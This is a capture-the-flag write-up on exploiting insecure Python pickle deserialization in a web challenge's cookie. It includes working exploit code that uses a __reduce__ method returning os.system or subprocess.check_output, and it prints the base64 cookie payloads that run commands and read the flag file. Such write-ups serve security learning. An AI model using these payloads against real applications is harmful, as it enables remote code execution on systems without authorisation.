# Challenge Description
Look Morty, look! I turned myself into a website Morty, I'm Website Rick babyyy!! But don't play around with some of them anti pickle serum I have stored somewhere safe, if I turn back to a human I'll have to go to family therapy and we don't want that Morty.

## Analysis

![rick-0](https://user-images.githubusercontent.com/87711310/211153526-90e16ea2-0d67-4b45-83eb-932febc43443.png)

All the references to `pickles` implies it's an `insecure deserialization` challenge. `pickle` is a serialization format used in python.

If we check the cookies, we get the following:
```
plan_b=KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu
```

Our guess is that this is a pickled python object, and decoding the base64 seems to imply that to us too:
```
$ echo 'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu' | base64 -d
(dp0
S'serum'
p1
ccopy_reg
_reconstructor
p2
(c__main__
anti_pickle_serum
p3
c__builtin__
object
p4
Ntp5
Rp6
s.
```

## Unpickling
Let's immediately try to unpickle the data, which should give us a feel for how data is parsed:
```python
from base64 import b64decode

import pickle

code = b'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'

serum = pickle.loads(b64decode(code))
print(serum)

```
$ python3 deserialize.py 
Traceback (most recent call last):
  File "deserialize.py", line 7, in <module>
    serum = pickle.loads(b64decode(code))
AttributeError: Can't get attribute 'anti_pickle_serum' on <module '__main__' from 'deserialize.py'>
```
  
The error is quite clear - there's no anti_pickle_serum variable. Let's add one in and try again.
```
code = b'KGRwMApT[...]'
anti_pickle_serum = 'test'
```
  
That error is fixed, but there's another one:
```python
$ python3 deserialize.py 
Traceback (most recent call last):
  File "deserialize.py", line 8, in <module>
    serum = pickle.loads(b64decode(code))
  File "/usr/lib/python3.8/copyreg.py", line 43, in _reconstructor
    obj = object.__new__(cls)
TypeError: object.__new__(X): X is not a type object (str)  
```
 
Here it's throwing an error because X (`anti_pickle_serum`) __is not a type object__ - so let's make it a class extending from `object`.  
```python
# [imports]
class anti_pickle_serum(object):
    def __init__(self):
        pass
# [...]
```
  
And now there's no error, and we get a response.
```
$ python3 deserialize.py 
{'serum': <__main__.anti_pickle_serum object at 0x7f9e1a1b1c40>}  
```
  
So the cookie is the pickled form of a dictionary with the key serum and the value of an `anti_pickle_serum` class.  
  
# Exploitation
For an introduction to pickle exploitation, I highly recommend [this blog post](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). Essentially, the `__reduce__` dunder method tells pickle how to deserialize, and to do so it takes a function and a list of parameters. We can set the function to `os.system` and the parameters to the code to execute!
```python
from base64 import b64encode

import pickle
import os

class anti_pickle_serum(object):
    def __reduce__(self):               # function called by the pickler
        return os.system, (['whoami'],)

code = pickle.dumps({'serum': anti_pickle_serum()})
code = b64encode(code)
print(code)
```

Here we create the malicious class, then serialize it as part of the dictionary as we saw before.
  
```
$ python3 final.py 
b'gASVLAAAAAAAAAB9lIwFc2VydW2UjAVwb3NpeJSMBnN5c3RlbZSTlIwGd2hvYW1plIWUUpRzLg=='  
```

Huh, that looks nothing like the original cookie value (which starts with KGRwMApTJ3)... maybe we missed something with the dumps?

Checking out the [dumps()](https://docs.python.org/3/library/pickle.html#pickle.dumps) documentation, there is a protocol parameter! If we [read a bit deeper](https://docs.python.org/3/library/pickle.html#data-stream-format), this can take a value from 0 to 5. If we play around, protocol=0 looks similar to the original cookie:

```python 
code = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)  
```  
  
```
$ python3 final.py 
b'KGRwMApWc2VydW0KcDEKY3Bvc2l4CnN5c3RlbQpwMgooVndob2FtaQpwMwp0cDQKUnA1CnMu'
```  

Let's change the cookie to this (without the b''):
  
![rick-1](https://user-images.githubusercontent.com/87711310/211153521-bb4b68f6-2226-4bcd-9a7a-87a88a147331.png)
  
As you can see now, the value 0 was returned. This is the return value of os.system! Now we simply need to find a function that returns the result, and we'll use `subprocess.check_output` for that.
  
```
return subprocess.check_output, (['ls'],)
``` 
  
Now run it
```
$ python final.py 
KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydscycKcDQKYXRwNQpScDYKcy4= 
```  
  
![rick-2](https://user-images.githubusercontent.com/87711310/211153524-b16ad799-1eaa-4a8e-8911-07a95eab63f6.png)
  
As can now see that there is a `flag_wIp1b` file, so we can just read it!
While it's tempting to do
```
return subprocess.check_output, (['cat flag_wIp1b'],)
```
  
`subprocess.check_output` requires a __list__ of parameters (as we see here) and the filename is a separate item in the list, like so:
```
return subprocess.check_output, (['cat', 'flag_wIp1b'],)
```

```
$ python final.py 
KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydjYXQnCnA0CmFTJ2ZsYWdfd0lwMWInCnA1CmF0cDYKUnA3CnMu
```

And boom - we get the flag! 
  
![rick-3](https://user-images.githubusercontent.com/87711310/211153525-944cf633-29f5-4724-803b-ac03a4fba1b5.png)
